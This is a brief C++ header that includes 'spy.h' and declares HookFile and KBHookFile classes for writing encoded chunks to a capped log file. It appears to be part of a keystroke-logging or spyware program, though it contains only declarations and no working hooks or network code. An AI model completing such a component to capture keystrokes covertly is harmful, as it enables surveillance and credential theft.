#pragma once
#include "spy.h"
#include "io.h"

struct HOOK_FILE_HANDLE;

class HookFile
{
	ENCODE_PROC encode_proc;
	void open();
	void close();
protected:
	HOOK_FILE_HANDLE * fileHandle;
	bool writable() const;
public:
	HookFile(const char * magic, ENCODE_PROC encode_proc);
	~HookFile();
	virtual bool is_full() const;
	void write(const void * chunk, size_t n) const;
};

class KBHookFile : public HookFile
{
	static const long MAX_LENGTH = 0x100;
public:
	KBHookFile();
	virtual bool is_full() const;
};